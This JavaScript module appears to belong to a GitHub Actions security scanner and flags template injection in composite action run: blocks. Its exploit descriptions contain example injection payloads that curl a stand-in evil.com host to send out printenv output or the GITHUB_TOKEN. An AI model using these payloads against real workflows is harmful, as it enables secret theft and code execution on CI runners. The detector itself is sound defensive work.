import { getActionSteps, findLineNumber, extractSnippet } from '../yaml-parser.js';

const DANGEROUS_CONTEXTS = [
  'github.event.issue.title',
  'github.event.issue.body',
  'github.event.pull_request.title',
  'github.event.pull_request.body',
  'github.event.comment.body',
  'github.event.review.body',
  'github.event.discussion.title',
  'github.event.discussion.body',
  'github.head_ref',
  'github.event.workflow_run.head_branch',
  'github.event.workflow_run.head_commit.message',
];

const DANGEROUS_PATTERNS = [
  /github\.event\.pages\.[^}]*page_name/,
  /github\.event\.commits\.[^}]*message/,
  /github\.event\.commits\.[^}]*author\.(name|email)/,
];

const EXPR_REGEX = /\$\{\{([\s\S]*?)\}\}/g;

function classifyExpression(expr) {
  const trimmed = expr.trim();
  if (trimmed.startsWith('inputs.')) return { dangerous: trimmed, severity: 'critical' };
  if (DANGEROUS_CONTEXTS.some(ctx => trimmed.includes(ctx))) return { dangerous: trimmed, severity: 'high' };
  for (const p of DANGEROUS_PATTERNS) {
    if (p.test(trimmed)) return { dangerous: trimmed, severity: 'high' };
  }
  return null;
}

export function checkActionYmlTemplateInjection(actionParsed, rawContent, filePath) {
  const findings = [];
  const steps = getActionSteps(actionParsed);

  for (const { step, stepIndex } of steps) {
    const runBlock = step.run;
    if (typeof runBlock !== 'string') continue;

    let match;
    EXPR_REGEX.lastIndex = 0;
    while ((match = EXPR_REGEX.exec(runBlock)) !== null) {
      const classified = classifyExpression(match[1]);
      if (!classified) continue;

      const { dangerous, severity } = classified;
      const lineNumber = findLineNumber(rawContent, match[0].replace(/[.*+?^${}()|[\]\\]/g, '\\$&').slice(0, 30));
      const snippet = extractSnippet(rawContent, lineNumber, 4);

      findings.push({
        id: `action-yml-template-injection-${filePath}-${stepIndex}`,
        rule: 'action-yml-template-injection',
        severity,
        title: 'Template Injection in Composite Action run: block',
        file: filePath,
        line: lineNumber,
        snippet,
        context: `Step ${stepIndex + 1}${step.name ? ` (${step.name})` : ''}`,
        detail: severity === 'critical'
          ? `Expression \`\${{ ${dangerous.trim()} }}\` interpolates a caller-supplied input directly into a shell \`run:\` block of a composite action. Any caller of this action controls the injected value without restriction.`
          : `Expression \`\${{ ${dangerous.trim()} }}\` is an attacker-controlled GitHub context value interpolated directly into a shell \`run:\` block.`,
        exploit: severity === 'critical'
          ? `Call the action with \`inputs.${dangerous.replace('inputs.', '')}: "'; curl https://evil.com/exfil?t=$(printenv | base64) #"\`. The shell runs the injected payload with full access to the runner's secrets and environment.`
          : `Open a PR or issue whose title/body contains \`'; curl https://evil.com/exfil?t=$(cat $GITHUB_TOKEN | base64) #'\`. When the composite action runs, the injected command executes with full secret access.`,
        impact: 'Remote Code Execution + Secret Exfiltration via Composite Action',
        remediation: `Map the value to an env variable and reference \`$ENV_VAR\` in the shell script instead of interpolating directly:\n\nenv:\n  SAFE_INPUT: \${{ ${dangerous.trim()} }}\nrun: |\n  echo "$SAFE_INPUT"`,
        cvss: {
          score: 9.8,
          vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
          cwe: 'CWE-94',
        },
      });
    }
  }

  return findings;
}
